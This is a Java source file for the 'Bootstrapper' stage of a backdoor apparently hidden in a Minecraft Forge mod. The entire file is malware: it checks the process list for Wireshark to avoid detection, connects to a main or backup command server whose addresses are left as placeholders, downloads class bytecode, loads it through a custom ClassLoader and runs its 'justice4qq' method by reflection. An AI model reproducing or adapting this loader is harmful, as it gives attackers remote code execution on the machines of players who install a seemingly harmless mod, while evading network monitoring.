package com.qqTechnologies.qqbackdoor;
/*
 * @author Crystallinqq on 7/7/2020
 */

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.ConnectException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

/*
 * Second class loaded from the original Forge mod.
 * Checks if Wireshark is running then downloads qqBackdoor itself if WS isn't present.
 * then loads main class and invokes the justice4qq method with Reflect API.
 */

public class Bootstrapper extends ClassLoader {
    private static final String host = "ip here"; //ip of main server
    private static final String backup = "ip here"; //ip of backup server
    private static final int port = 0; //replace with port of serverz

    public Class<?> addClass(String name, byte[] ok) {
        try {
            Class<?> clazz = this.define(name, ok);
            Method method = clazz.getMethod("justice4qq");
            method.invoke(null);
            return clazz;
        }
        catch (Throwable e) {
            e.printStackTrace();
        }
        return null;
    }


    private static byte[] readByteArrayLWithLength(DataInputStream reader) throws IOException {
        int length = reader.readInt();
        if(length > 0) {
            byte[] bytes = new byte[length];
            reader.readFully(bytes, 0, bytes.length);
            return bytes;
        }
        return null;
    }


    public Class<?> define(String name, byte[] b) {
        Class<?> clazz = defineClass(name, b, 0, b.length);
        return clazz;
    }

    public void run() {
        try {
            boolean detected = false;
            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command("tasklist.exe");
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.toLowerCase().contains("wireshark")) {
                    detected = true;
                }
            }

            if(!detected) {
                DataInputStream in = null;
                try {
                    Socket socket = new Socket(host, port);
                    in = new DataInputStream(socket.getInputStream());
                    socket.getOutputStream().write("replaceMeme".getBytes(StandardCharsets.UTF_8));
                    socket.getOutputStream().flush();
                } catch (ConnectException e) {
                    try {
                        Socket socket = new Socket(backup, port);
                        in = new DataInputStream(socket.getInputStream());
                        socket.getOutputStream().write("replaceMeme".getBytes(StandardCharsets.UTF_8));
                        socket.getOutputStream().flush();
                    } catch (Exception ignored) {}
                }
                if (in != null) {
                    byte[] bytes = readByteArrayLWithLength(in);
                    addClass("com.qqTechnologies.qqbackdoor", bytes);
                }
            }
        } catch (IOException ignored) {}

    }
}
